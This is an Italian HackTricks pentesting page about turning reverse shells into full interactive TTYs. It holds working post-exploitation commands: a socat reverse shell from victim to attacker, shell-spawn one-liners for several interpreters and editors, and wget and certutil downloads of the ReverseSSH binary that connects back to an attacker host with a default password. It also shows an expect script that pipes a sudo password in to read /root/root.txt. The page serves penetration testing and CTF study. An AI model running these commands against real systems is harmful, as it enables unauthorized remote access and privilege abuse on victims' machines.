# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Nota che la shell che imposti nella variabile `SHELL` **deve** essere **elencata all'interno** _**/etc/shells**_ o `Il valore per la variabile SHELL non è stato trovato nel file /etc/shells Questo incidente è stato segnalato`. Inoltre, nota che i prossimi snippet funzionano solo in bash. Se sei in zsh, cambia in bash prima di ottenere la shell eseguendo `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Puoi ottenere il **numero** di **righe** e **colonne** eseguendo **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Un modo conveniente per **accesso shell interattivo**, così come **trasferimenti di file** e **port forwarding**, è scaricare il server ssh staticamente collegato [ReverseSSH](https://github.com/Fahrj/reverse-ssh) sul target.

Di seguito è riportato un esempio per `x86` con binari compressi upx. Per altri binari, controlla la [pagina delle release](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Preparati localmente per catturare la richiesta di port forwarding ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Obiettivo Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Obiettivo Windows 10 (per versioni precedenti, controlla [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Se la richiesta di port forwarding ReverseSSH è stata completata con successo, ora dovresti essere in grado di accedere con la password predefinita `letmeinbrudipls` nel contesto dell'utente che esegue `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) aggiorna automaticamente le reverse shell Linux a TTY, gestisce la dimensione del terminale, registra tutto e molto altro. Inoltre, fornisce supporto per readline per le shell Windows.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Se per qualche motivo non puoi ottenere un TTY completo, **puoi comunque interagire con i programmi** che si aspettano input dell'utente. Nell'esempio seguente, la password viene passata a `sudo` per leggere un file:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
